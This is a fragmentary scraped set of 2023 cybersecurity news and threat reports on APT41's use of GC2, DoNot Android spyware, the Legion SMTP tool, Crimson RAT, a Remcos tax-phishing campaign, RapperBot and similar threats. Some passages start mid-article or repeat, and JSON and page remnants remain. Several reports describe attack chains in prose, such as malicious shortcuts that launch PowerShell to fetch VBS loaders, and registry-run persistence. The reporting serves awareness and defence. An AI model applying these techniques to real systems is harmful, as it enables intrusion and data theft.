McCarthy, principal security researcher at Valtix, added that Legion automates real world tactics, techniques and procedures at scale, reducing the threat actors time to initial access. McCarthy explained that if the hacker can’t exploit the target organization’s infrastructure remotely, then there are options to brute-force AWS credentials and set up phishing campaigns with Amazon SES.“The AWS module also tags newly created malicious users, working as a defense evasion technique and establishing legitimacy,” said McCarthy. “Even target reconnaissance is made easy by integrating with Shodan.”U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Transitioning to cloud-native environments has brought along security risks for companies, according to TechRadar.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Apr 23Wed Dec 6On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "text": " The Chinese state-sponsored hacking group APT41 was found abusing the GC2 (Google Command and Control) red teaming tool in data theft attacks against a Taiwanese media and an Italian job search company.In Google's April 2023 Threat Horizons Report, released last Friday, security researchers in its Threat Analysis Group (TAG) revealed that APT41 was abusing the GC2 red teaming tool in attacks.GC2, also known as Google Command and Control, is an open-source project written in Go that was designed for red teaming activities.\"Furthermore, the program will interact only with Google's domains (*.google.com) to make detection more difficult.\"The project consists of an agent that is deployed on compromised devices, which then connects back to a Google Sheets URL to receive commands to execute.These commands cause the deployed agents to download and install additional payloads from Google Drive or exfiltrate stolen data to the cloud storage service.According to Google's report, TAG disrupted an APT41 phishing attack against a Taiwanese media company that attempted to distribute the GC2 agent through phishing emails.\"The payload was an open source red teaming tool called \"Google Command and Control\" (GC2).\"Google says that APT41 also used GC2 in attacks against an Italian job search website in July 2022.Using the agent, Google says that the threat actors attempted to deploy additional payloads on the device and exfiltrate data to Google Drive, as illustrated in the attack workflow below.While it is not known what malware was distributed in these attacks, APT41 is known to deploy a wide variety of malware on compromised systems.The threat actors have also been known to deploy the Winnti malware and the China Chopper web shell, tools commonly used by Chinese hacking groups, and Cobalt Strike for persistence in compromised networks.BleepingComputer contacted Google to learn more about the payloads they saw in these attacks, but a response was not immediately available.APT41's use of GC2 is another indicator of a trend of threat actors moving to legitimate red teaming tools and RMM platforms as part of their attacks.Unfortunately, as with any tool that can help red teamers conduct exercises or for admins to manage a network remotely, they can equally be abused by threat actors in their own attacks."

      "title": "DoNot APT Targets Individuals in South Asia using Android Malware - CYFIRMA",
      "text": " Recently CYFIRMA observed a cyber-attack on an individual residing in Kashmir, India. CYFIRMA research team collected two pieces of malware from the download folder of the victim’s mobile. Analysis of the samples links this attack with DoNot APT, historically very active in the region.The collected malware in the download folder of the victim’s mobile implicates that the threat actor used third-party file-sharing websites, leading to files being downloaded and saved in the main download folder on the mobile device. There is also a plausibility that the threat actor has developed their own file-sharing online platform as a delivery mechanism. The malware samples were decoyed as chatting apps with the name “Ten Messenger.apk” and “Link Chat QQ.apk”. Based on the naming conventions of the collected samples, there is an impression that they are either related to chat applications or may potentially be chat applications. However, after analyzing both samples, the team found the apps to be total dummies, it doesn’t even work properly to keep victims engaged with the app for the purpose of chatting. After further analysis, it was found that both samples are highly obfuscated, and codes are scattered to make the analyses difficult. The app is similar to other malicious apps used in previous campaigns, which are more than one year old. The malicious app leverages Google’s firebase for a command-and-control server.Our analysis of the obtained samples revealed the presence of encrypted strings. Specifically, in the Android samples from the previous campaign, the strings were encrypted using a layer of the Base64 algorithm. However, in the current sample, the team analyzed, we found that the strings were encrypted with two layers of encryption – Base64 and AES256, with CBC mode and PKCS padding. The code was obfuscated and protected using Pro Guard, making it difficult to understand. Overall, our technical analysis points to the DoNot APT as the perpetrator of this attack, which is consistent with their past targeting of entities in the Kashmir region of India.The threat actor is active since 2016 and has been carrying out cyber strikes in the South Asian region. There are some media articles reporting that the threat actor belongs to the Indian soil, but we cannot confidently confirm if they belong to India, or what interest they are currently serving. In the past, the threat actor has also targeted their adversary with spear phishing attacks from different target industries and regions. The threat actor is known for their consistent attacks and the same was reflected, when we observed two different apps in the victim’s mobile with different command and control servers, belonging to DoNot APT.The attack is not surprising to the threat intelligence community, as DoNot has previously targeted NGOs and other entities in the Kashmir area, as well as other regions of India, Bangladesh, and Pakistan on multiple occasions. The aim behind the attack is still unknown; however, with a medium level of confidence, we can say that the threat actor could have employed a spear messaging attack. The threat actor could have used WhatsApp or other chatting messengers for the initial stage of the social engineering attack to deliver the app. Because apps were found in the download folder, and it is only possible when delivered by a third-party file-sharing site. Attaching the app directly to WhatsApp increases the chances of malicious apps getting detected, but sending the app as a file attachment saves the file in the WhatsApp media location and not in the download folder, which is the same with other chatting messengers.Upon Installing, the Android Malware Sample asks the victim to open the app.After opening the App, it asks the victim to enable the accessibility service, shown below in the screenshot. It shows the victim the same alert every time the app is opened, until the victim enables it.After Clicking on “Ok”, the app takes the victim to the accessibility setting page, where it asks the victim to enable Accessibility, by clicking on “Link Chat” and turning the accessibility service on. Also, upon turning the accessibility on, the app hides from the main menu and it restricts the victim from uninstalling the app to an extent.Below is a snippet from the Android Manifest file, the malicious app tries to access most of the permissions to perform malicious tasks.Below are a few dangerous permissions described that malicious Android app accesses:Below is a screenshot of the files, after decompiling the Android package, using Bytecode Viewer. The snippet shows scattered modules as part of obfuscation.The extract below is the code that interacts with the command-and-control server. The command-and-control domain was encrypted with Base64 and AES256, with CBC mode and PKCS padding. The decryption of the string revealed playstoree[.]xyz domain. The suspected IOC is a year old and belongs to the notorious Do Not APT.The snippet below is of the module, where a class is used for encryption and decryption of the string, using a secret key.The below Snippet shows a module that is exploiting “android.intent.action.NEW_OUTGOING_CALL” and “android.intent.extra.PHONE_NUMBER” permission to monitor outgoing and incoming calls of the compromised victims.The extract below shows that the module is storing call logs with a few other details, such as time and duration in JSON Array and is ready to send it over to the command- and-control server.The snippet below shows the module where it fetches GPS location, if it’s turned on in the victim’s phone.The screenshot below shows the module where Names and Numbers are extracted into Contacts.txt and sent over to the command-and-control server.The threat actor is constantly targeting individuals in the Kashmir region of India. Their attack is not so sophisticated and the aim behind the attack is still unknown. While compiling this report, we have come across another sample that has a different name, but the code used in this sample is similar to that of the previous samples analysed, except for the command-and-control domain. This domain is new and has not been flagged as a malicious IOC anywhere. Also, our analysis of almost two-year- old APKs has revealed that the string was encrypted only with Base64 algorithms, whereas, the samples obtained one year ago revealed that the string was encrypted using two layers of encryption, including Base64 and AES256 with CBC mode and PKCS padding. This indicates that the threat actor has been utilizing the same tactics and techniques for the past two years. It is expected that the group will utilize similar and consistent tactics and techniques, especially in the context of spear phishing via messaging, to target their intended victims.Indicators of CompromiseMITRE ATT&CK Technique DetectionCopyright CYFIRMA.

(Photo by: Jeffrey Greenberg/Education Images/Universal Images Group via Getty Images)Two federal agencies issued warnings about USB-based charging attacks, where hackers inject malware or siphon data from devices of unsuspecting consumers looking to charge their phone, computer or gadget on the go. “Malware installed through a corrupted USB port can lock a device or export personal data and passwords directly to the perpetrator. Criminals can then use that information to access online accounts or sell it to other bad actors,” the April 11 post stated. The FCC went on to say that criminals have intentionally left cables plugged in at charging stations, and have been known to give away infected cables as promotional gifts.Andy Thompson, a researcher for identity management firm CyberArk, said he was first introduced to juice jacking in 2011 at Defcon, where it was presented more as a proof of concept than a viable attack method. Thompson said the attack method happens very rarely — if at all — in the wild, but added that juice jacking could be mitigated by using USB Data Blockers or using your own charging cables.Juice jacking has become less theoretical with the commercialization and abuse of penetration testing tools such as Rubber Ducky that market themselves as \"a (USB) flash drive that types keystroke injection payloads into unsuspecting computers at incredible speeds.\" It adds, \"To a human it's a flash drive. To a computer it's a keyboard, typing at superhuman speeds.\"The FCC recommends using AC power outlet instead of charging stations and to use your own USB cables and portable charger when traveling. It adds, if you are prompted to select \"share data\" or “charge only” when you plug in your device, always select “charge only.”Another option is to use a data-blocking USB charging dongle that are designed to limit connections to charging only.Stephen Weigand is managing editor and production manager for SC Media.

      "text": " The LockBit ransomware gang has created encryptors targeting Macs for the first time, likely becoming the first major ransomware operation to ever specifically target macOS.BleepingComputer analyzed the strings in the LockBit encryptor for Apple M1 and found strings that are out of place in a macOS encryptor, indicating that these were likely haphazardly thrown together in a test.Furthermore, the encryptor contains a list of sixty-five file extensions and filenames that will be excluded from encryption, all of them being Windows file extensions and folders.A small snippet of the Windows files the Apple M1 encryptor will not encrypt is listed below, all out of place on a macOS device.Almost all of the ESXi and Windows strings are also present in the MIPs and FreeBSD encryptors, indicating that they use a shared codebase.The good news is that these encryptors are likely not ready for deployment in actual attacks against macOS devices.Instead, Wardle told BleepingComputer that he believes the macOS encryptor is based on the Linux version and compiled for macOS with some basic configuration settings.Furthermore, Wardle told us that when the macOS encryptor is launched, it crashes due to a buffer overflow bug in its code.\"It seems that macOS is now on their radar ... but other than compiling it for macOS, and adding a basic config (which are just basic flags ...not specific to macOS per se) this is far from ready for deployment,\" Wardle told BleepingComputer.Wardle further shared that the LockBit developer must first \"figure out how to bypass TCC, get notarized\" before becoming a functional encryptor.While Windows has been the most targeted operating system in ransomware attacks, nothing prevents developers from creating ransomware that targets Macs.However, as the LockBit operation is known for pushing the envelope in ransomware development, it would not be surprising to see more advanced and optimized encryptors for these CPU architectures released in the future.Therefore, all computer users, including Mac owners, should practice good online safety habits, including keeping the operating system updated, avoiding opening unknown attachments and executables, generate offline backups, and using strong and unique passwords at every site you visit.Update 4/16/23: In response to questions from BleepingComputer, the public-facing representative of LockBit, known as LockBitSupp, said that the Mac encryptor is \"actively being developed.\"While LockBit has a history of toying with security researchers and the media, if true, we will likely see more production-quality versions in the future.Furthermore, while it's not clear how useful a macOS encryptor would be in the enterprise, some LockBit affiliates target consumers and small businesses, where an encryptor like this could be more useful."

      "text": "  A simple mail transfer protocol (SMTP) abuse tool dubbed Legion can scan Shodan to identify misconfigured cloud servers and then take over SMTP email marketing programs or launch phishing campaigns.Legion can also send SMS text messages to launch mobile-based phishing and disinformation campaigns and has targeted 14 different telecoms, including AT&T, Sprint, T-Mobile, and Verizon. It can also bundle additional functionality traditionally found in more common hacking tools, such as the ability to execute web server specific exploit code and brute force account credentials. Matt Muir, a threat intelligence researcher at Cado, said security administrators can neutralize Legion by making sure their environment files are not exposed to the public internet. “Environment files are text files used to store credentials,” explained Muir. “By securing the environment files there’s not much Legion can do. Admins have to make sure that the environment files are not located in a directory that’s exposed to the internet.”Muir said Cado researchers consider Legion an emerging generation of cloud-focused credential harvester/spam utilities. Developers of these tools often steal each other's code, making attribution to a particular group difficult.“Mail and SMS abuse are big business for attackers,” wrote Ahl. “We have come across close to a dozen variants of similar scripts that are being sold regularly for nefarious purposes. Legion is not the first nor will it be the last.”The Telegram groups used to distribute Legion have a combined membership of about 5,000. Muir said although we can assume not everybody in these groups will purchase a license for the software, it’s clear that there’s now considerable demand for such a tool.“If even half of the members purchased a license and used the SMTP abuse capabilities for spam or phishing purposes, I don’t think it’s unreasonable to assume that tens of thousands of users would be affected,” said Muir, who also footnoted that at the time the blog was written, Cado researchers had seen zero detections on VirusTotal.“Attackers often look to get access to an API using credentials or tokens obtained through nefarious means,” said Rago. “Once they gain the valid privileged credential or token, the attacker can leverage the API to exfiltrate data or compromise a service.”Davis McCarthy, principal security researcher at Valtix, added that Legion automates real world tactics, techniques and procedures at scale, reducing the threat actors time to initial access. McCarthy explained that if the hacker can’t exploit the target organization’s infrastructure remotely, then there are options to brute-force AWS credentials and set up phishing campaigns with Amazon SES.“The AWS module also tags newly created malicious users, working as a defense evasion technique and establishing legitimacy,” said McCarthy. “Even target reconnaissance is made easy by integrating with Shodan.”U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Transitioning to cloud-native environments has brought along security risks for companies, according to TechRadar.Vulnerabilities in API authorization have been named by Wallarm as the second greatest security risk facing APIs, emphasizing the ease of leveraging authorizations as backdoors as well as the urgent need to ensure authorization maintenance, reports SiliconAngle.Tue Apr 23Wed Dec 6On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

The impact is further broadened by legitimate clients working to access the site, as they add to the load size. According to the alert, “In most cases, the DNS proxy server and the DNS authoritative server will use all their time handling those bad requests.” Successful attacks cause a higher utilization of resources and a cache filled with NXDOMAIN replies, which can “ultimately slow or completely prevent an authorized user from gaining access to a website or services.”These NXDOMAIN DDoS attacks could bear negative consequences for end users, network providers, and website owners, HC3 warned. Websites and other service providers are the typical target of these attacks and designed to make their service inaccessible to legitimate customers.Receiving small amounts of NXDOMAIN responses is considered normal during business hours, as users can mistype web addresses or leverage “dead hyperlinks” to nonexistent servers. But these are typically redirected to the proper server.\"A DNS NXDOMAIN flood DDoS attack is dangerous because it can be difficult to detect. Many DNS server administrators misidentify the slowdown as a performance problem when in actuality it is a NXDOMAIN attack on their DNS server,\" according to NETSCOUT researchers.To detect malicious NXDOMAIN attacks, HC3 warned that network defenders should look out for large volumes of DNS queries for non-existent hostnames under legitimate domains.The alert contains a list of all attack techniques, including widely distributed IPs, possibly spoofed source IPS, and traffic made up of UDP packets encapsulated in IPv4 and IPv6. Network defenders are urged to be cautious when blocking IPs, as it could inadvertently block legitimate users from accessing their public services. NETSCOUT recommends several key mitigation measures to reduce the impact, which are contained in the threat analysis.

We are working around the clock to restore full service for our customers,\" NCR told BleepingComputer. \"In addition, we are providing our customers with dedicated assistance and workarounds to support their operations as we work toward full restoration.\"This post also included a snippet of the negotiation chat conversation between an alleged NCR representative and the ransomware gang.According to his chat, the ransomware gang told NCR they had not stolen any data stored on servers during the attack.However, the threat actors claimed to have stolen credentials for NCR's customers and stated that they would be published if a ransom was not paid.\"We take a lot of credentials to your clients networks used to connect for Insight, Pulse, etc. We will give you this list after payment,\" the threat actors told NCR.BlackCat has since taken down the NCR post from their data leak site, likely hoping the company would be willing to negotiate a ransom.The ransomware gang received the name BlackCat due to the image of a black cat on its data leak site. However, the threat actors call themselves ALPHV internally when discussing their operation on hacking forums and in negotiations.Since its launch, the ransomware operation has grown into one of the most significant ransomware active at this time, responsible for hundreds of attacks worldwide, with ransom demands ranging from $35,000 to over $10 million."

We could not find the specific ransomware deployed during the incidents, though.However, we were told that the tactics, techniques, and procedures (TTPs) echo an attack that the BlackBerry Incident Response team investigated last summer.From a ransomware perspective, legitimate RMM software is versatile enough to fit their needs, provides wide reach on the network, and ensures continued persistence because security agents in the environment do not usually flag the platforms as a threat.While Action1 RMM is used legitimately across the world by thousands of administrators, the vendor is aware that the product is being abused by threat actors in the post-compromise stage of an attack for lateral movement.Mike Walters, VP of Vulnerability and Threat Research and co-founder of Action1 Corporation, told BleepingComputer that the company introduced last year a system based on artificial intelligence to detect abnormal user behavior and to prevent hackers from using the platform for malicious purposes.“Last year we rolled-out a threat actor filtering system that scans user activity for suspicious patterns of behavior, automatically suspends potentially malicious accounts, and alerts Action1’s dedicated security team to investigate the issue” - Mike Walters\"At the same time, I would like to emphasize that these attacks do not target the Action1 users since our platform has not been compromised,\" Walters added Action1 is working on including new measures to stop the misuse of the platform, the researcher said, adding that the company is “fully open to cooperation with both victims and legal authorities” on cases where Action1 was leveraged for cyberattacks.Update [April 18]: Added updated statement from Action1."

      "text": " Wibemax matches the name of a Pakistani software development company, but at this time we have not identified a clear relationship to the adversary.Our analysis reinforces the assessment that closely monitoring the research endeavors of adversary nations has become an important objective for the adversary, underscoring the crucial role this activity plays in fulfilling the goals and aspirations of the authorities whose interests Transparent Tribe represents.The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding.The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants. The macros create and decompress an embedded archive file in the %ALLUSERSPROFILE% directory (C:\\ProgramData) and execute the Crimson RAT payload within. Some macros insert text in the document, which is typically education-themed content relating to India.In addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT. Malicious documents that implement this technique require users to double-click a document element. The documents distributed by Transparent Tribe typically display an image (a “View Document” graphic) indicating that the document content is locked. This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe).As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds. Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run only if the victim’s machine name differs. G551JW or DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions.Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbook, and targets. Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embedding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations. Transparent Tribe’s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group.Get notified when we post new content.Thanks!

      "text": " Microsoft is warning of a phishing campaign targeting accounting firms and tax preparers with remote access malware allowing initial access to corporate networks.With the USA reaching the end of its annual tax season, accountants are scrambling to gather clients' tax documents to complete and file their tax returns.Due to this, it makes it an ideal time for threat actors to target tax preparers, hoping that they mistakenly open malicious files that they would generally be more careful with when less busy.This is exactly what Microsoft sees in a new phishing scam targeting tax professionals to install the Remcos remote access trojan malware.\"With U.S. Tax Day approaching, Microsoft has observed phishing attacks targeting accounting and tax return preparation firms to deliver the Remcos remote access trojan (RAT) and compromise target networks beginning in February of this year,\" Microsoft warns in a new report.The phishing campaign starts with emails that pretend to be clients sending the necessary documents to complete their return.\"I apologize not responding sooner; our individual tax return should be simple and not require much of your time,\" reads a phishing email seen by Microsoft.\"I believe you would require a copy of our most recent year's documents, such as W-2s, 1099s, mortages, interest, donations, medical investments, HSAs, and so on which I have uploaded below.\"These phishing emails contain links that utilize click-tracking services to evade detection by security software, and ultimately lead to a file hosting site that downloads a ZIP archive.This ZIP archive contains numerous files pretending to be PDF files for various tax forms but are actually Windows shortcuts.When double-clicked, these Windows shortcuts will execute PowerShell to download a heavily obfuscated VBS file from a remote host, which is saved to C:\\Windows\\Tasks\\ and executed.At the same time, the VBS script will download a decoy PDF file and open it in Microsoft Edge to avoid arousing suspicion by the targeted person.Microsoft says that these VBS files will download and execute the GuLoader malware, which in turn, installs the Remcos remote access trojan.Using this access, the threat actors can spread further through the network, stealing data and deploying other malware on a device.Microsoft says that while phishing campaigns commonly use tax-related themes, this campaign is unusual as its only targets tax preparation firms and individuals.\"While social engineering lures like this one are common around Tax Day and other big topic current events, these campaigns are specific and targeted in a way that is uncommon.\"\"The targets for this threat are exclusively organizations that deal with tax preparation, financial services, CPA and accounting firms, and professional service firms dealing in bookkeeping and tax.\"As accountants hold highly sensitive data for individuals and corporations, a data breach in this type of organization could significantly harm a large group of people.Unfortunately, Windows shortcuts are a special file type that uses the .lnk file extension but does not show the file extension when displayed in File Explorer.This behavior makes detecting that a file is a shortcut in disguise more difficult. However, listing files in File Explorer in 'Details' mode will show that it is Windows Shortcut, making it a bit easier to spot.Ultimately, no one should click on links in emails or open attachments unless they confirm if they are sent from a legitimate contact. Otherwise, delete the email."

      "title": "QuaDream mobile spyware case raises new concerns over zero-click exploits | SC Media",
      "text": "  Just how dangerous are these new zero-click exploits to rank-and-file businesses?Shridhar Mittal, chief executive officer at Zimperium, explained that there are two main classes of mobile spyware: nation-state level products like those from organizations such as QuaDream that often leverage zero-click vulnerabilities, and those that leverage less sophisticated delivery techniques — such as social engineering — to infect devices. “While the delivery techniques vary, there are hardly any differences in the spying capabilities of both classes once the device has been infected,” said Mittal. “There’s no denying that these threats are real and continue to be a growing problem, which isn’t just impacting government entities and high-profile targets like journalists and activists, but it's a threat to all corporate employees.”Zero-click exploits are cyberattacks that don't require user intervention to trigger the attack. These attacks are automatic and usually go undetected, executed without a trace as soon as the code hits the user’s device.Chuck Everette, Field CISO at Virsec, said that zero-click exploits are terrifying and are considered the crown jewel of vulnerabilities.“What is so disruptive about this spyware is that its ability to monitor, use the camera and geolocation functionalities, access and retrieve files, even get into hardened security areas such as the iOS keychain or even generating one-time passwords that can be used to bypass multi-factor authentication processes,” said Everette. “What makes this spyware variant so destructive is that it’s good at covering its tracks and utilizing Apple’s own native files in a ‘living-off-the-land' type of strategy. This makes it very difficult to detect, let alone protect against.”Everette added that security teams need to start moving into a preventative mindset, being proactive instead of reactive. He recommends that security pros tell their users not to log-on to unknown websites.“For a zero-click compromise to succeed it needs to load from a website or downloaded from an application that has been compromised,” said Everette. “For Apple devices running iOS 16 or Mac OS central lockdown mode is available to assist in protecting against attacks.”On a broader level, Michael Covington, vice president of strategy at Jamf, said his team sees a steady stream of evidence that mobile devices are increasingly targeted by hackers. Because of a misguided perception that modern mobile devices are secure, Covington said organizations often fail to protect remote workers with the same level of attention provided to traditional computer devices.The combination of increased attacks and an under-secured workforce results in more compromises and longer time periods between exploit and detection, not to mention remediation and post-event clean-up.“Providing the attribution to QuaDream puts a spotlight on the commercial malware market that goes largely under-reported,” said Covington. “Many organizations make the incorrect assumption that malware, including mobile spyware like the NSO Group’s Pegasus, is a best-effort exercise. The reality is that there are commercial organizations employing full-time developers, consulting engineers, and customer support teams to help paying attackers target victims, silently launch attacks, maintain malware efficacy, and extract maximum value from a pay-to-use malicious service. It’s these well-funded, for-profit organizations that all vendors — not just security vendors — need to consider as they release and maintain products in all sectors.”Shane Huntley, senior director of Google’s Threat Analysis Group (TAG), added that at this time there are limited options for security teams when it comes to addressing zero-click exploits. Huntley said the most important components are securing and managing devices as best as possible, as well as having strong security controls in place to mitigate any potential compromises.Ukraine had experienced a less than a day-long power outage in October 2022 following an attack by Russian state-sponsored hacking operation Sandworm targeted at an electrical substation amid the ongoing Russia-Ukraine war, marking the first cyberattack-related power interruption in the country since 2017, CyberScoop reports.Attacks deployed by Iranian state-backed threat operation MuddyWater against Israel saw the utilization of the new MuddyC2Go command-and-control framework, which replaced the PhonyC2 custom platform following the exposure of its source code, reports The Hacker News.Israel had its technology, logistics, and transportation industries targeted by Iranian advanced persistent threat operation Charming Kitten, also known as APT35 and Imperial Kitten, last month amid its ongoing war with Palestinian militant group Hamas, according to The Record, a news site by cybersecurity firm Recorded Future.On-Demand EventOn-Demand EventOn-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

      "title": "New Mirai Variant Employs Uncommon Tactics to Distribute Malware",
      "text": " A new version of a Mirai variant called RapperBot is the latest example of malware using relatively uncommon or previously unknown infection vectors to try and spread widely.RapperBot first surfaced last year as Internet of Things (IoT) malware containing large chunks of Mirai source code but with some substantially different functionality compared with other Mirai variants. The differences included the use of a new protocol for command-and-control (C2) communications and a built-in feature for brute-forcing SSH servers rather than Telnet services, as is common in Mirai variants.Kaspersky's analysis of the malware showed it also integrated what the security vendor described as an \"intelligent\" and somewhat uncommon feature for brute-forcing telnet. Rather than brute-forcing with a huge set of credentials, the malware checks the prompts received when it telnets to a device — and based on that, selects the appropriate set of credentials for a brute-force attack. That significantly speeds up the brute-forcing process compared with many other malware tools, Kaspersky said.\"When you telnet to a device, you typically get a prompt,\" says Jornt van der Wiel, a senior security researcher at Kaspersky. The prompt can reveal some information that RapperBot uses to determine the device it's targeting and which credentials to use, he says. Depending on the IoT device that is targeted, RapperBot uses different credentials, he says. \"So, for device A, it uses user/password set A; and for device B, it uses user/password set B,\" van der Wiel says.The malware then uses a variety of possible commands, such as \"wget,\" \"curl,\" and \"ftpget\" to download itself on the target system. If these methods don't work, the malware uses a downloader and installs itself on the device, according Kaspersky.RapperBot's brute-force process is relatively uncommon, and van der Weil says he can't name other malware samples that use the approach. Even so, given the sheer number of malware samples in the wild, it's impossible to say if it is the only malware currently using this approach. It's likely not the first piece of malicious code to use the technique, he says.Kaspersky pointed to RapperBot as one example of malware employing rare and sometimes previously unseen techniques to spread.Another example is \"Rhadamanthys,\" an information stealer available under a malware-as-a-service option on a Russian language cybercriminal forum. The info stealer is one among a growing number of malware families that threat actors have begun distributing via malicious advertisements. The growing success that threat actors have had with malvertising scams is spurring an increase in the use of the technique. The authors of Rhadamanthys, for instance, initially used phishing and spam emails before switching to malicious advertisements as the initial infector vector. \"Rhadamanthys doesn’t do anything different from other campaigns using malvertising,\" van der Weil says. \"It is, however, part of a trend that we see malvertising is becoming more popular.\"Another trend Kaspersky has spotted: the growing use of open source malware among less-skilled cybercriminals. Take CueMiner, a downloader for coin-mining malware available on GitHub. Kaspersky's researchers have observed attackers distributing the malware using Trojanized versions of cracked apps downloaded via BitTorrent or from OneDrive sharing networks. \"Due to its open source nature, everybody can download and compile it,\" van der Weil explains. \"As these users are typically not very advanced cybercriminals, they have to rely on relatively simple infection mechanisms, such as BitTorrent and OneDrive.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " Thousands of Medicaid recipients in Iowa had their personal information leaked in a 2022 attack on the healthcare software company Independent Living Systems (ILS), the state's Department of Health and Human Services revealed this week.The information leaked included names, addresses, dates of birth, driver’s license numbers, Social Security numbers, financial account information and medical data such as diagnosis codes and health insurance information.Officials in Iowa said that the information of 20,800 Iowa Medicaid members was involved in the ILS breach.Officials confirmed that Iowa’s Medicaid system was not breached. But the organization works with a private contractor named Telligen, which provides annual assessments for Medicaid members to make sure they are receiving the correct healthcare services.The state said Telligen subcontracted some of that work to ILS, which has provided third-party administrative services to health plans, providers, hospitals, and pharmaceutical and medical device companies for nearly two decades.Despite the initial breach of ILS’ network occurring in July 2022, the company only finished its investigation in the last two months, informing Telligen of the leak on February 14. Telligen in turn notified Iowa officials on February 17.Iowa officials did not respond to requests for comment on if they will continue to work with Telligen and ILS after the leak.Paul Bischoff, the editor of tech services website Comparitech, told The Record that the disclosure of the breach took far too long, giving hackers more than eight months to exploit the leaked information.“A lot of damage could have already been done. Criminals could use the breached info for identity theft, Medicaid fraud, and phishing, among other attacks,” he said.Jonathan Greig is a Breaking News Reporter at Recorded Future News.

      "text": " According to SentinelLabs, hackers gained access to victims' devices through phishing emails that contained education-themed malicious attachments that were created in July and August 2022. Once opened, the threat actors used either Microsoft Office macros or Object Linking and Embedding (OLE) to install the Crimson malware onto the computer.OLE embedding is a technology used to embed and link objects, such as data or media files, within a document. Attackers can use it to hide the malware within the document itself, so it is executed when the document is opened.Crimson is a remote access trojan (RAT), a type of malware that provides an attacker with remote access to a victim's computer. Crimson is capable of exfiltrating system information, capturing screenshots, starting and stopping processes, and listing all the files and drives on the computer.The group has used Crimson in most of its operations, constantly modifying it.Transparent Tribe has been active since 2013 and has targeted government organizations in around 30 countries. The group usually creates fake domains mimicking a government organization before delivering a payload.According to researchers, Transparent Tribe is likely getting help from third parties to support its work, including Pakistani web hosting provider Zain Hosting.Transparent Tribe is not a “very sophisticated group,” according to SentinelLabs, but is highly persistent and “continuously adapts its operational strategy.”“Transparent Tribe’s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group,” the researchers said.Daryna Antoniuk\nis a freelance reporter for Recorded Future News based in Ukraine.

      "text": "  The study, conducted between December 2022 and January 2023, surveyed 203 security and IT pros from CRA’s Business Intelligence research panel, offered four important findings. Just under half (44%) of respondents have already implemented IAM in part or in full, while 19% are developing an IAM strategy, and 26% are now giving it serious consideration. In total, 98% of respondents have implemented or are considering an IAM strategy. Respondents who have made progress with IAM are choosing various paths to deployment: 22% have opted for an on-prem configuration, 24% for a cloud-based setup, and 25% have chosen a hybrid model blending on-prem and cloud solutions.IAM progress has largely been motivated by a desire to get ahead of the growing pains of transforming today’s workforce. Respondents said today’s IAM efforts prioritize multi-factor authentication (84%), unique passwords (82%), single sign-on (77%), and role-based access control (67%).Respondents worry about the complexity of IAM products and how they can strain the user experience. Fifty-six percent of respondents say they are now focusing on improving the user experience, often cited as a leading pain point in implementing IAM.As one respondent remarked: “Who wants to spend hours in understanding a product that always requires additional expertise to handle when its objective is to provide efficiency?”As they look to the future, companies will need to think carefully about how to roll out IAM in a way that improves the organization’s security posture, and respects the needs and preferences of its users.CRA’s advice to security teams: have an IAM game plan, keep the user experience front and center, focus on iteration, not solving everything all at once, and to more effectively embrace the remote work trend, make identity the perimeter based on zero-trust.TechCrunch reports that more than a million Maine residents were confirmed by state government officials to have had their personal data compromised as part of the widespread MOVEit file transfer system hack conducted by the Cl0p ransomware operation.U.S. advanced electronic components manufacturer Kyocera AVX Components Corporation has disclosed that 39,111 individuals around the world had their data compromised following a ransomware attack earlier this year, which has been claimed by the LockBit ransomware operation, reports BleepingComputer.U.S. cloud data analytics and log analysis firm Sumo Logic has confirmed discovering a potential security incident after its Amazon Web Services account was accessed using stolen credentials, reports TechCrunch.Thu Dec 7Tue Mar 26On-Demand Event   \n        Copyright © 2023 CyberRisk Alliance, LLC All Rights Reserved.\n        This material may not be published, broadcast, rewritten or redistributed\n        in any form without prior authorization.\n      "

